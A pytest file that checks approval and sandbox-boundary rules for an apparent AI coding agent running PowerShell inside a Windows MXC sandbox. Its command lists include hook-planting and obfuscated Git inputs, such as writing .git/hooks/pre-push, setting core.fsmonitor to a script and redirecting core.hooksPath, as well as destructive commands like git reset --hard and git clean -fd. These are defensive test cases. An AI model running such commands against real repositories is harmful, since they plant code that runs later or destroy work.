"""On Windows a command inside the MXC sandbox follows the mode, as it does in Codex.

MXC runs PowerShell, whose aliases, functions and profiles this engine cannot
resolve, so every PowerShell command used to need a person. The sandbox is the
boundary instead: a command that runs in it follows the mode, and what it needs
beyond it (network, a local preview, folders) is requested and goes through the
access review, which is then the decision about that access.

No rule here reads what a command means. A person is still asked where a fact
about what executes says the command leaves that boundary: the shell tool hands
a literal Git command that changes the repository writable repository metadata,
a grant carries credentials, the launcher itself has networking on, the runner
is not this sandbox, or the helper is a revision that was not probed.

Dispatch is a capture: no command in this file runs.
"""

from __future__ import annotations

import io
import os
import subprocess
import sys
from dataclasses import replace
from types import SimpleNamespace

import pytest
from rich.console import Console
from test_approval_review import _reviewer, _Surface

from alysis_code.agent.errors import AgentRuntimeError, ApprovalDeclinedError
from alysis_code.agent.tools_assembly import build_tools
from alysis_code.background_runner import LazyBackgroundShellRunner
from alysis_code.command_review_rules import github_write_reason
from alysis_code.git_native import (
    git_metadata_writes,
    programs_exposed,
    shell_git_route,
    takes_metadata_permission,
    writes_a_remote,
)
from alysis_code.runtime_kind import RuntimeKind
from alysis_code.sandbox_runner import (
    HostShellRunner,
    LazyShellRunner,
    SeatbeltShellRunner,
    contained_backend,
)
from alysis_code.sandbox_settings import ShellSandboxSettings
from alysis_code.surface import ApprovalDecision
from alysis_code.windows_mxc import WindowsMxcRunner, mxc_scope_bounds_command
from alysis_code.windows_sandbox import WindowsNativeRunner

CLOSED = ShellSandboxSettings(backend="windows-mxc")
_KEEP = object()

OPAQUE = [
    "pytest -q",
    "python -m pytest tests",
    "npm test",
    "ls -la",
    "Get-ChildItem -Force",
    "Get-Content a.py | Measure-Object -Line",
    "$env:CI = '1'; python build.py",
    "& .\\scripts\\build.ps1 -Fast",
    'python -c "print(1)"',
    "python --version",
]
# Literal Git that the shell tool runs where nothing is writable: real Git in
# a read-only job, or the fixed read worker.
GIT_READS = [
    "git status",
    "git diff",
    "git diff --cached",
    "git log --oneline -5",
    "git show --stat HEAD",
    "git branch --show-current",
    "git rev-parse --abbrev-ref HEAD",
    "git config --local --get user.name",
    "git ls-files",
    # Spelled to write, sent to the read-only job, which refuses the write.
    "git log --output=.git/hooks/pre-push --format=x",
]
# Literal Git the shell tool sends to the Git job. The job lets it write the
# repository's objects, refs and index, and nothing a later Git would run.
GIT_WRITES = [
    "git commit -m x",
    "git add -A",
    "git checkout -b topic",
    "git switch -c topic --no-track origin/main",
    "git stash",
    "git branch topic",
    "git tag v1",
    "git merge topic",
    "git cherry-pick abc1234",
    "git revert HEAD",
    "git rm old.py",
    "git mv a.py b.py",
    "git init",
    "git init -q -b main new-folder",
    "git -C sub commit -m x",
    "git fetch origin",
    # Run the same way; Git is refused what they need and says so.
    "git rebase main",
    "git worktree add ../other",
    "git submodule update --init",
]
# The same, and the command throws work away: "Approve for me" asks its reviewer.
GIT_WRITES_THAT_DISCARD = [
    "git reset --hard HEAD~1",
    "git branch -D old",
    "git clean -fd",
    "git checkout -- a.py",
    "git restore .",
    "git stash drop",
]
# The repository these write does not exist yet, so the job cannot keep its
# configuration and hooks as they are: a person decides.
GIT_WRITES_OF_A_NEW_REPOSITORY = [
    "git clone -- https://example.invalid/r.git r",
    "git init --template=elsewhere",
    "git init --separate-git-dir=elsewhere",
    "git init --bare",
]
# A literal push changes a remote, which no sandbox contains: a person decides.
GIT_WRITES_TO_A_REMOTE = [
    "git push origin main",
    "git push --tags origin",
    "git -C sub push",
]
# Git that changes only what a later Git runs. The Git job takes these for a
# command a person approved permissions.git_metadata for, and not otherwise.
GIT_CONFIGURATION = [
    "git config user.name Someone",
    "git config --unset core.hooksPath",
    "git config core.fsmonitor ./x.ps1",
    "git remote add origin https://example.invalid/r.git",
    "git remote set-url origin https://example.invalid/r.git",
]
# Git reached any other way runs in the general shell like every other command,
# with the repository metadata write-protected. Nothing reads these as Git.
GIT_OUTSIDE_THE_GIT_JOB = [
    *GIT_CONFIGURATION,
    "git status; git commit -m x",
    "echo ok; git status",
    "cmd /c git commit -m x",
    "& git commit -m x",
    "Start-Process git -ArgumentList 'commit','-m','x'",
    "Invoke-Expression 'git config core.hooksPath .hooks'",
    'powershell -Command "git add -A"',
    "if ($true) { git commit -m x }",
    "$out = git rev-parse HEAD",
    "git status 2>&1 | Out-String",
    "& ('g' + 'it') commit -m x",
    "rg git src",
]


class _BackgroundStarted(Exception):
    pass


class _Manager:
    """A terminal manager that records a start and never launches anything."""

    def __init__(self, runner):
        self._runner = runner
        self.started: list[str] = []

    def start(self, *, cmd, cwd, root, **scoped):
        self.started.append(cmd)
        raise ValueError("captured start")


@pytest.fixture
def mxc_selected(monkeypatch):
    """Backend selection answers as it does on Windows, on any host."""
    monkeypatch.setattr(
        "alysis_code.sandbox_runner.select_shell_sandbox_backend",
        lambda _: SimpleNamespace(backend="windows-mxc", requires_command_approval=False),
    )


@pytest.fixture
def harness(tmp_path, monkeypatch):
    # Simulate this module's Windows eligibility checks without changing the
    # host's os.name (which would make pathlib construct unusable WindowsPaths).
    monkeypatch.setattr(
        "alysis_code.agent.tools_assembly.os", SimpleNamespace(**{**vars(os), "name": "nt"})
    )
    monkeypatch.setattr(
        "alysis_code.agent.tools_assembly.sys",
        SimpleNamespace(**{**vars(sys), "platform": "win32"}),
    )
    root = tmp_path / "project"
    root.mkdir()
    monkeypatch.setenv("ALYSIS_CONFIG_DIR", str(tmp_path / "config"))
    monkeypatch.setenv("ALYSIS_MEMORY_HOME", str(tmp_path / "memory"))
    monkeypatch.setenv("ALYSIS_TERMINAL_OWNERSHIP_DIR", str(tmp_path / "terminal"))
    state = {"settings": CLOSED, "backend": "windows-mxc"}
    monkeypatch.setattr(
        "alysis_code.agent.tools_assembly.resolve_shell_sandbox_settings",
        lambda _: state["settings"],
    )
    monkeypatch.setattr(
        "alysis_code.sandbox_runner.select_shell_sandbox_backend",
        lambda _: SimpleNamespace(backend=state["backend"], requires_command_approval=False),
    )
    monkeypatch.setattr(
        "alysis_code.sandbox_runner.build_shell_runner_from_settings",
        lambda settings, *a, **k: WindowsMxcRunner(settings),
    )
    dispatched: list[str] = []
    runners: list[object] = []
    whole: list[bool] = []

    def captured(**kw):
        dispatched.append(kw["cmd"])
        runners.append(kw.get("runner"))
        # What the handler tells the Git job about a person's decision.
        whole.append(bool(kw.get("git_whole_metadata")))
        return {"exit_code": 0, "stdout": "", "stderr": ""}

    monkeypatch.setattr("alysis_code.agent_loop.shell_run", captured)
    reviewer, client, store = _reviewer(root, [], user_message="Run the checks")

    class Surface(_Surface):
        def request_approval(self, request):
            self.requests.append(request)
            return ApprovalDecision(request.kind == "sandbox_access")

    surface = Surface()

    def run(
        command,
        *,
        mode="auto",
        tool="shell_run",
        permissions=None,
        persist=None,
        runner=None,
        manager=None,
        settings=None,
        backend=_KEEP,
        yes=True,
        same_turn=False,
    ):
        if settings is not None:
            state["settings"] = settings
        if backend is not _KEEP:
            state["backend"] = backend
        tools = state.get("tools") if same_turn else None
        tools = tools or build_tools(
            root=root,
            console=Console(file=io.StringIO()),
            surface=surface,
            store=store,
            mode=mode,
            yes=yes,
            shell_runner=runner if runner is not None else WindowsMxcRunner(state["settings"]),
            terminal_manager=manager,
            runtime_kind=RuntimeKind.INTERACTIVE_CHAT,
            approval_reviewer=reviewer,
        )
        state["tools"] = tools
        params = {"cmd": command}
        if permissions is not None:
            params["permissions"] = permissions
        if persist is not None:
            params["persist"] = persist
        try:
            tools[tool].run(params)
        except (ApprovalDeclinedError, AgentRuntimeError) as caught:
            return caught
        return None

    return SimpleNamespace(
        run=run,
        surface=surface,
        dispatched=dispatched,
        runners=runners,
        whole=whole,
        client=client,
        root=root,
    )


def _person_cards(surface, kind="shell_run"):
    return [r for r in surface.requests if r.kind == kind]


# ---- commands in the sandbox follow the mode -------------------------------


@pytest.mark.parametrize("command", OPAQUE + GIT_READS + GIT_OUTSIDE_THE_GIT_JOB)
@pytest.mark.parametrize("mode", ["auto", "fullaccess"])
def test_sandboxed_command_runs_without_a_mandatory_person_card(harness, command, mode):
    assert harness.run(command, mode=mode) is None
    assert harness.dispatched == [command]
    assert not _person_cards(harness.surface)
    assert not harness.client.calls


@pytest.mark.parametrize("command", GIT_WRITES)
def test_git_change_runs_without_a_mandatory_person_card(harness, command):
    assert harness.run(command, mode="auto") is None
    assert harness.dispatched == [command]
    assert not _person_cards(harness.surface)
    assert not harness.client.calls
    # The Git job keeps what a later Git runs from a command nobody decided on.
    assert harness.whole == [False]


@pytest.mark.parametrize("command", GIT_WRITES + GIT_WRITES_THAT_DISCARD)
def test_git_change_that_cannot_ask_for_the_metadata_keeps_the_person(harness, command):
    """Full access offers no permissions, so a rebase could not be asked for:
    there a Git change needs the person as before."""
    assert isinstance(harness.run(command, mode="fullaccess"), ApprovalDeclinedError)
    assert not harness.dispatched
    (card,) = _person_cards(harness.surface)
    assert card.command == command and card.metadata["always_ask_person"]


def _approve_everything(harness):
    harness.surface.request_approval = lambda request: (
        harness.surface.requests.append(request) or ApprovalDecision(True)
    )


@pytest.mark.skipif(os.name != "nt", reason="the shell tool routes Git this way on Windows only")
@pytest.mark.parametrize(
    ("command", "mode"),
    [
        ("git rebase main", "fullaccess"),
        ("git commit -m x", "fullaccess"),
        ("git push origin main", "auto"),
        ("git push origin main", "fullaccess"),
    ],
)
def test_a_git_command_a_person_decided_on_gets_the_whole_metadata(harness, command, mode):
    """As every Git change did while each one needed a person."""
    _approve_everything(harness)
    assert harness.run(command, mode=mode) is None
    assert harness.dispatched == [command]
    (card,) = _person_cards(harness.surface)
    assert card.metadata["always_ask_person"]
    assert harness.whole == [True]
    # The sandbox the command runs in is the one everything else runs in.
    assert not harness.runners[-1].settings.git_metadata_access


@pytest.mark.skipif(os.name != "nt", reason="the shell tool routes Git this way on Windows only")
@pytest.mark.parametrize(
    "settings",
    [
        replace(CLOSED, mode="warn"),
        replace(CLOSED, network="on"),
        replace(CLOSED, clear_env=False),
    ],
)
def test_a_decided_git_command_runs_under_every_launcher_setting(harness, settings):
    """A person's yes changes what the Git job gives, not how the runner is built."""
    _approve_everything(harness)
    assert harness.run("git rebase main", mode="auto", settings=settings) is None
    assert harness.dispatched == ["git rebase main"] and harness.whole == [True]


def test_backend_selection_admits_git_metadata_for_this_sandbox_and_seatbelt_only():
    """The runner for an approved Git command is built from settings that carry it."""
    from alysis_code.config_errors import ConfigError
    from alysis_code.sandbox_runner import select_shell_sandbox_backend

    approved = replace(CLOSED, git_metadata_access=True)
    for settings in (approved, replace(approved, backend="auto")):
        assert select_shell_sandbox_backend(settings, system="Windows").backend == "windows-mxc"
    for settings, system in (
        (replace(approved, backend="windows-native"), "Windows"),
        (replace(approved, mode="warn"), "Windows"),
        (replace(approved, protect_repo_meta=False), "Windows"),
        (replace(approved, clear_env=False), "Windows"),
        (replace(approved, backend="auto"), "Linux"),
        (replace(approved, backend="bwrap"), "Linux"),
        (approved, "Darwin"),
    ):
        with pytest.raises(ConfigError):
            select_shell_sandbox_backend(settings, system=system)


@pytest.mark.skipif(os.name != "nt", reason="the shell tool routes Git this way on Windows only")
def test_a_persons_decision_about_another_command_gives_git_nothing(harness):
    """One set of tools throughout, as in one turn of a session."""
    _approve_everything(harness)
    # A push keeps the person; the commit after it is asked about by nobody.
    assert harness.run("git push origin main", mode="auto") is None
    assert harness.run("git commit -m x", mode="auto", same_turn=True) is None
    assert harness.run("pytest -q", mode="auto", same_turn=True) is None
    assert harness.run("git status", mode="auto", same_turn=True) is None
    assert harness.run("git push origin main", mode="auto", same_turn=True) is None
    assert harness.run("git add -A", mode="auto", same_turn=True) is None
    assert harness.whole == [True, False, False, False, True, False]
    assert len(_person_cards(harness.surface)) == 2


def test_a_declined_git_command_leaves_nothing_for_the_next_one(harness):
    assert isinstance(harness.run("git push origin main", mode="auto"), ApprovalDeclinedError)
    assert harness.run("git commit -m x", mode="auto", same_turn=True) is None
    assert harness.dispatched == ["git commit -m x"] and harness.whole == [False]


def test_sandboxed_command_in_review_mode_gets_the_ordinary_card(harness):
    assert isinstance(harness.run("pytest -q", mode="review"), ApprovalDeclinedError)
    (card,) = _person_cards(harness.surface)
    assert "review mode" in card.reason
    assert not card.metadata.get("always_ask_person")
    assert card.allow_for_session_scope is not None


@pytest.mark.parametrize("command", GIT_WRITES)
def test_ordinary_git_change_asks_nobody_in_approve_for_me(harness, command):
    """Staging, committing and branching follow the mode, as on macOS."""
    assert harness.run(command, yes=False) is None
    assert harness.dispatched == [command]
    assert not harness.client.calls and not _person_cards(harness.surface)


@pytest.mark.parametrize("command", GIT_WRITES_THAT_DISCARD)
def test_git_command_that_throws_work_away_goes_to_the_reviewer(harness, command):
    """Without --yes, "Approve for me" asks its reviewer, never a person, and runs on its yes."""
    assert harness.run(command, yes=False) is None
    assert harness.dispatched == [command]
    assert len(harness.client.calls) == 1
    assert not _person_cards(harness.surface)


@pytest.mark.parametrize("command", GIT_WRITES)
def test_git_change_in_review_mode_gets_the_ordinary_card(harness, command):
    assert isinstance(harness.run(command, mode="review"), ApprovalDeclinedError)
    (card,) = _person_cards(harness.surface)
    assert not card.metadata.get("always_ask_person")


@pytest.mark.parametrize("command", GIT_WRITES_OF_A_NEW_REPOSITORY + GIT_WRITES_TO_A_REMOTE)
@pytest.mark.parametrize("mode", ["auto", "fullaccess"])
def test_git_that_writes_a_new_repository_or_a_remote_still_needs_a_person(harness, command, mode):
    assert isinstance(harness.run(command, mode=mode), ApprovalDeclinedError)
    assert not harness.dispatched
    (card,) = _person_cards(harness.surface)
    assert card.command == command and card.metadata["always_ask_person"]


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
@pytest.mark.parametrize("command", [*GIT_CONFIGURATION, "git rebase main", "git commit -m x"])
@pytest.mark.parametrize("mode", ["auto", "review"])
def test_git_metadata_for_a_git_command_is_a_persons_decision(harness, command, mode):
    """Whoever reviewed the request, the command that gets Git's own metadata waits for a person."""
    outcome = harness.run(command, mode=mode, permissions={"git_metadata": True})
    assert isinstance(outcome, ApprovalDeclinedError)
    assert not harness.dispatched
    card = harness.surface.requests[-1]
    assert card.kind == "shell_run" and card.command == command
    assert card.metadata["always_ask_person"]


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
@pytest.mark.parametrize(
    "command",
    [
        "python tool.py",
        "git status",
        "git log --oneline -3",
        "git add -A; git commit -m x",
        "cmd /c git config user.name Someone",
        "& git rebase main",
    ],
)
def test_git_metadata_is_refused_where_it_would_change_nothing(harness, command):
    """Only the Git job receives the metadata, and it runs one literal Git command."""
    from alysis_code.config_errors import ConfigError

    with pytest.raises(ConfigError, match="one literal Git command"):
        harness.run(command, permissions={"git_metadata": True})
    assert not harness.dispatched and not harness.surface.requests


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
def test_git_metadata_cannot_be_kept_for_later_commands(harness):
    from alysis_code.config_errors import ConfigError

    for scope in ("turn", "session"):
        with pytest.raises(ConfigError, match="limited to one operation"):
            harness.run("git rebase main", permissions={"git_metadata": True, "scope": scope})
    assert not harness.dispatched and not harness.surface.requests


# ---- escalations are decided by the access review ---------------------------


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
@pytest.mark.parametrize(
    "permissions",
    [
        {"network": True, "reason": "install a dependency"},
        {"local_preview": True, "reason": "check the dev server"},
        {"network": True, "local_preview": True, "reason": "both"},
    ],
)
def test_reviewed_access_needs_no_second_person_card(harness, permissions):
    """In Approve for me the reviewer decides the access, and that is the decision."""
    assert harness.run("python tool.py", permissions=permissions) is None
    assert harness.dispatched == ["python tool.py"]
    assert len(harness.client.calls) == 1  # the access review, by the reviewer
    assert not harness.surface.requests  # and no person card of any kind


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
def test_access_the_review_refused_runs_nothing(harness):
    harness.client.answers.append({"decision": "deny"})
    harness.surface.request_approval = lambda request: (
        harness.surface.requests.append(request) or ApprovalDecision(False)
    )
    assert harness.run("python tool.py", permissions={"network": True}) is not None
    assert not harness.dispatched


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
def test_access_in_review_mode_is_one_person_card(harness):
    """In Ask for approval the person decides the access on a card that shows the
    command. That card is the decision; a second mandatory one no longer follows."""
    assert harness.run("python tool.py", mode="review", permissions={"network": True}) is None
    assert harness.dispatched == ["python tool.py"]
    assert not harness.client.calls
    assert [r.kind for r in harness.surface.requests] == ["sandbox_access"]


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
@pytest.mark.parametrize("grant", ["read_files", "github_auth"])
def test_credential_grants_keep_the_person_on_the_command(harness, tmp_path, grant):
    """The access review does not stand in for the person where a command is
    handed a file that may hold a secret, or an account."""
    if grant == "read_files":
        secret = tmp_path / "token.txt"
        secret.write_text("synthetic")
        command, permissions = "python tool.py", {"read_files": [str(secret)]}
    else:
        command, permissions = "git push origin main", {"github_auth": True, "network": True}
    assert isinstance(harness.run(command, permissions=permissions), ApprovalDeclinedError)
    assert not harness.dispatched and not harness.client.calls
    access, card = harness.surface.requests
    assert access.kind == "sandbox_access" and access.metadata["always_ask_person"]
    assert card.kind == "shell_run" and card.metadata["always_ask_person"]


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
@pytest.mark.parametrize(
    "permissions",
    [
        {"environment": ["TOKEN"]},
        {"network": True, "network_domains": ["example.test"]},
    ],
)
def test_grants_this_sandbox_does_not_offer_are_refused_outright(harness, monkeypatch, permissions):
    """Forwarded variables and domain lists cannot be requested for this
    sandbox, so no reviewed grant can carry them."""
    from alysis_code.config_errors import ConfigError

    monkeypatch.setenv("TOKEN", "synthetic")
    with pytest.raises(ConfigError, match="require macOS Seatbelt"):
        harness.run("python tool.py", permissions=permissions)
    assert not harness.dispatched and not harness.surface.requests


@pytest.mark.parametrize(
    "settings",
    [
        replace(CLOSED, network="on"),
        replace(CLOSED, preview_access="local"),
        replace(CLOSED, mode="warn"),
        replace(CLOSED, mode="off"),
    ],
)
@pytest.mark.parametrize("mode", ["auto", "fullaccess"])
def test_launcher_settings_nobody_reviewed_keep_the_person(harness, settings, mode):
    """Networking the launcher turned on was not reviewed for this command."""
    assert isinstance(harness.run("pytest -q", mode=mode, settings=settings), ApprovalDeclinedError)
    assert not harness.dispatched
    (card,) = _person_cards(harness.surface)
    assert card.metadata["always_ask_person"]


# ---- what executes decides, not the configuration ---------------------------


@pytest.mark.parametrize("backend", ["host", "bwrap", "docker", "windows-native", "seatbelt", None])
def test_only_mxc_settings_bound_a_command(harness, backend):
    assert isinstance(harness.run("pytest -q", backend=backend), ApprovalDeclinedError)
    assert not harness.dispatched


@pytest.mark.parametrize(
    "runner",
    [
        HostShellRunner(),
        WindowsNativeRunner(CLOSED),
        SeatbeltShellRunner(),
        WindowsMxcRunner(replace(CLOSED, network="on")),
        WindowsMxcRunner(replace(CLOSED, preview_access="local")),
        WindowsMxcRunner(replace(CLOSED, git_metadata_access=True)),
        WindowsMxcRunner(replace(CLOSED, additional_read_files=("C:\\key",))),
        WindowsMxcRunner(replace(CLOSED, github_auth=True)),
        LazyShellRunner(lambda: HostShellRunner()),
        LazyShellRunner(lambda: HostShellRunner(), settings=replace(CLOSED, network="on")),
    ],
)
def test_the_real_runner_decides_not_the_configuration(harness, runner):
    assert isinstance(harness.run("pytest -q", runner=runner), ApprovalDeclinedError)
    assert not harness.dispatched


def test_unresolved_lazy_runner_is_judged_by_its_captured_settings(harness):
    runner = LazyShellRunner(lambda: WindowsMxcRunner(CLOSED), settings=CLOSED)
    assert harness.run("pytest -q", mode="fullaccess", runner=runner) is None
    assert harness.dispatched == ["pytest -q"]
    assert runner.resolved_runner is None  # the guard never initialises a helper


def test_a_mixed_pair_of_sandboxes_does_not_bound_a_command(harness, monkeypatch):
    """The launcher's settings and the runner must be the same proven sandbox."""
    monkeypatch.setattr(
        "alysis_code.sandbox_runner.seatbelt_scope_has_no_remote_route",
        lambda scope: isinstance(scope, ShellSandboxSettings),
    )
    assert isinstance(harness.run("pytest -q"), ApprovalDeclinedError)
    assert not harness.dispatched


@pytest.mark.parametrize("command", ["Get-ChildItem", "pytest -q", "git status"])
@pytest.mark.parametrize("mode", ["auto", "fullaccess"])
def test_seatbelt_containment_never_excuses_a_powershell_command(
    harness, monkeypatch, command, mode
):
    """Seatbelt runs /bin/sh. If everything claims to be Seatbelt while a Windows
    runner is what executes, the claim says nothing about the PowerShell command."""
    monkeypatch.setattr(
        "alysis_code.sandbox_runner.seatbelt_scope_has_no_remote_route", lambda scope: True
    )
    assert isinstance(harness.run(command, mode=mode), ApprovalDeclinedError)
    assert not harness.dispatched
    (card,) = _person_cards(harness.surface)
    assert card.metadata["always_ask_person"]


def test_an_unprobed_helper_revision_keeps_the_person(harness, monkeypatch):
    monkeypatch.setattr("alysis_code.windows_mxc_containment.PROBED_SECURITY_REVISION", 10)
    assert isinstance(harness.run("pytest -q"), ApprovalDeclinedError)
    assert not harness.dispatched


def test_the_probed_revision_is_the_one_the_engine_requires():
    """A helper with a new security revision must be probed before this moves."""
    from alysis_code.windows_mxc_containment import PROBED_SECURITY_REVISION
    from alysis_code.windows_mxc_contract import helper_contract

    assert helper_contract()["security_revision"] == PROBED_SECURITY_REVISION
    assert helper_contract()["containment"] == "mxc-psec"


def test_git_directory_the_sandbox_cannot_protect_keeps_the_person(harness, monkeypatch):
    """A .git file may name a Git directory that is itself an approved folder."""
    monkeypatch.setattr(
        "alysis_code.windows_sandbox.git_directory_left_writable", lambda root, settings: True
    )
    assert isinstance(harness.run("pytest -q"), ApprovalDeclinedError)
    assert not harness.dispatched


# ---- the scope question -----------------------------------------------------

CREDENTIALS_OR_METADATA = [
    {"additional_read_files": ("C:\\key",)},
    {"forward_env": ("TOKEN",)},
    {"ssh_agent_socket": "\\\\.\\pipe\\openssh-ssh-agent"},
    {"github_auth": True},
    {"git_metadata_access": True},
    {"unix_sockets": ("/tmp/agent.sock",)},
    {"private_network_endpoints": ("10.0.0.1:22",)},
    {"network_domains": ("example.test",)},
    {"clear_env": False},
    {"protect_repo_meta": False},
]
REVIEWABLE_ACCESS = [
    {"network": "on"},
    {"preview_access": "local"},
    {"network": "on", "preview_access": "local"},
]
FOLDERS = [
    {"additional_read_roots": ("C:\\docs",)},
    {"additional_workspace_roots": ("C:\\other",)},
    {"windows_read_roots": ("C:\\tools",)},
]


@pytest.mark.parametrize("change", CREDENTIALS_OR_METADATA)
def test_credentials_and_git_metadata_are_never_inside_the_boundary(mxc_selected, change):
    for reviewed in (False, True):
        assert not mxc_scope_bounds_command(replace(CLOSED, **change), reviewed_access=reviewed)
        assert not mxc_scope_bounds_command(
            WindowsMxcRunner(replace(CLOSED, **change)), reviewed_access=reviewed
        )


@pytest.mark.parametrize("change", REVIEWABLE_ACCESS)
def test_network_and_preview_count_only_when_reviewed(mxc_selected, change):
    assert mxc_scope_bounds_command(CLOSED)
    assert contained_backend(CLOSED) == "windows-mxc"
    assert not mxc_scope_bounds_command(replace(CLOSED, **change))
    assert not mxc_scope_bounds_command(WindowsMxcRunner(replace(CLOSED, **change)))
    assert mxc_scope_bounds_command(replace(CLOSED, **change), reviewed_access=True)
    assert contained_backend(replace(CLOSED, **change), reviewed_access=True) == "windows-mxc"


@pytest.mark.parametrize("change", FOLDERS)
def test_approved_folders_stay_inside_the_boundary(mxc_selected, change):
    assert mxc_scope_bounds_command(replace(CLOSED, **change))
    assert mxc_scope_bounds_command(WindowsMxcRunner(replace(CLOSED, **change)))


def test_scope_check_fails_closed_on_everything_else(mxc_selected):
    class NativeGitJob(WindowsMxcRunner):
        pass

    for scope in (
        object(),
        None,
        HostShellRunner(),
        SeatbeltShellRunner(),
        WindowsNativeRunner(CLOSED),
        NativeGitJob(CLOSED),
        WindowsMxcRunner(object()),
        replace(CLOSED, mode="warn"),
        replace(CLOSED, mode="off"),
    ):
        for reviewed in (False, True):
            assert not mxc_scope_bounds_command(scope, reviewed_access=reviewed)
            assert contained_backend(scope, reviewed_access=reviewed) != "windows-mxc"


def test_a_selection_that_cannot_be_answered_is_a_no(monkeypatch):
    def broken(_settings):
        raise RuntimeError("selection failed")

    monkeypatch.setattr("alysis_code.sandbox_runner.select_shell_sandbox_backend", broken)
    assert not mxc_scope_bounds_command(CLOSED)


def test_reviewed_access_never_makes_seatbelt_the_boundary(monkeypatch):
    """On macOS any grant keeps the person; that rule is not changed here."""
    monkeypatch.setattr(
        "alysis_code.sandbox_runner.seatbelt_scope_has_no_remote_route", lambda scope: True
    )
    assert contained_backend(SeatbeltShellRunner()) == "seatbelt"
    assert contained_backend(SeatbeltShellRunner(), reviewed_access=True) is None


# ---- the rule is not asked to read PowerShell --------------------------------


@pytest.mark.parametrize("command", ["pytest -q", "git push origin main", "echo hello"])
@pytest.mark.parametrize("dialect", ["powershell", "cmd"])
def test_the_rule_itself_still_holds_every_windows_command(command, dialect):
    """The guard decides from what executes; the rule's answer for Windows text is unchanged."""
    plain = github_write_reason(command, dialect=dialect)
    assert github_write_reason(command, dialect=dialect, remote_unreachable=True) == plain


@pytest.mark.parametrize("command", OPAQUE + GIT_READS + GIT_OUTSIDE_THE_GIT_JOB)
def test_the_rule_is_not_consulted_for_a_sandboxed_command(harness, monkeypatch, command):
    def refuse(*args, **kwargs):
        raise AssertionError("the rule was asked about a sandboxed command")

    monkeypatch.setattr("alysis_code.command_review_rules.github_write_reason", refuse)
    assert harness.run(command) is None


# ---- one question about Git -------------------------------------------------


@pytest.mark.parametrize("command", GIT_READS)
def test_git_reads_run_where_nothing_is_writable(command):
    route = shell_git_route(command)
    assert route is not None and route[0] in {"native-read", "reader"}
    assert not git_metadata_writes(command)


ALL_GIT_WRITES = (
    GIT_WRITES + GIT_WRITES_THAT_DISCARD + GIT_WRITES_OF_A_NEW_REPOSITORY + GIT_WRITES_TO_A_REMOTE
)
NOT_FOR_THE_GIT_JOB = GIT_OUTSIDE_THE_GIT_JOB[len(GIT_CONFIGURATION) :]


@pytest.mark.parametrize("command", ALL_GIT_WRITES)
def test_git_writes_are_handed_the_metadata(command):
    assert shell_git_route(command)[0] == "native-write"
    assert git_metadata_writes(command)


@pytest.mark.parametrize("command", GIT_WRITES + GIT_WRITES_THAT_DISCARD)
def test_the_git_job_keeps_what_a_later_git_runs_from_an_ordinary_change(command):
    assert not programs_exposed(command, CLOSED)
    # A person's approval of the metadata is what gives the command the rest.
    assert programs_exposed(command, replace(CLOSED, git_metadata_access=True)) == (
        not command.startswith("git init")
    )


@pytest.mark.parametrize("command", GIT_WRITES_OF_A_NEW_REPOSITORY)
def test_a_new_repository_is_written_whole(command):
    assert programs_exposed(command, CLOSED)


@pytest.mark.parametrize("command", ALL_GIT_WRITES + GIT_READS + GIT_OUTSIDE_THE_GIT_JOB + OPAQUE)
def test_only_a_literal_push_states_a_remote_write(command):
    assert writes_a_remote(command) == (command in GIT_WRITES_TO_A_REMOTE)
    # The job gives a push what it gives a commit, and nothing a later Git runs.
    assert not (writes_a_remote(command) and programs_exposed(command, CLOSED))


@pytest.mark.parametrize("command", GIT_CONFIGURATION)
def test_configuration_reaches_the_git_job_only_with_the_metadata(command):
    assert shell_git_route(command) is None and not programs_exposed(command, CLOSED)
    assert shell_git_route(command, metadata_access=True)[0] == "native-write"
    assert takes_metadata_permission(command)
    assert programs_exposed(command, replace(CLOSED, git_metadata_access=True))


@pytest.mark.parametrize("command", GIT_READS + OPAQUE + NOT_FOR_THE_GIT_JOB)
def test_the_metadata_changes_nothing_for_everything_else(command):
    assert shell_git_route(command, metadata_access=True) == shell_git_route(command)
    assert not takes_metadata_permission(command)
    assert not programs_exposed(command, replace(CLOSED, git_metadata_access=True))


@pytest.mark.parametrize("command", GIT_OUTSIDE_THE_GIT_JOB + OPAQUE)
def test_everything_else_runs_in_the_general_shell(command):
    assert shell_git_route(command) is None and not git_metadata_writes(command)


@pytest.mark.skipif(os.name != "nt", reason="the shell tool routes Git this way on Windows only")
@pytest.mark.parametrize("approved", [False, True])
@pytest.mark.parametrize("command", GIT_READS + ALL_GIT_WRITES + GIT_OUTSIDE_THE_GIT_JOB + OPAQUE)
def test_shell_tool_dispatch_matches_the_guards_question(tmp_path, monkeypatch, command, approved):
    """The job with writable metadata starts exactly when the guard's question says so."""
    from alysis_code.tools.shell import shell_run

    taken: list[str] = []

    def native(**kwargs):
        taken.append("native-read" if kwargs.get("inspection") else "native-write")
        return subprocess.CompletedProcess("", 0, "", "")

    class Reader:
        def __init__(self, *args, **kwargs):
            pass

        def run(self, *args, **kwargs):
            taken.append("reader")
            return {"exit_code": 0, "stdout": "", "stderr": "", "truncated": False}

    class Runner(WindowsMxcRunner):
        def run(self, **kwargs):
            taken.append("general")
            return subprocess.CompletedProcess(kwargs["cmd"], 0, "", "")

    monkeypatch.setattr("alysis_code.git_native.run", native)
    monkeypatch.setattr("alysis_code.contained_read_tools.ContainedReadTools", Reader)
    # A person's decision about the command changes what the job gives it,
    # never the route: it is passed on to the job and to nothing else.
    whole = []
    monkeypatch.setattr(
        "alysis_code.git_native.run",
        lambda **kwargs: whole.append(kwargs.get("whole_metadata")) or native(**kwargs),
    )
    shell_run(root=tmp_path, cmd=command, runner=Runner(CLOSED), git_whole_metadata=True)
    route = shell_git_route(command)
    assert taken == [route[0] if route else "general"]
    assert whole == ([True] if route and route[0] != "reader" else [])
    taken.clear()
    settings = replace(CLOSED, git_metadata_access=approved)
    shell_run(root=tmp_path, cmd=command, runner=Runner(settings))
    route = shell_git_route(command, metadata_access=approved)
    assert taken == [route[0] if route else "general"]
    if approved:
        assert (taken == ["native-write"]) == takes_metadata_permission(command)
    else:
        assert (taken == ["native-write"]) == git_metadata_writes(command)


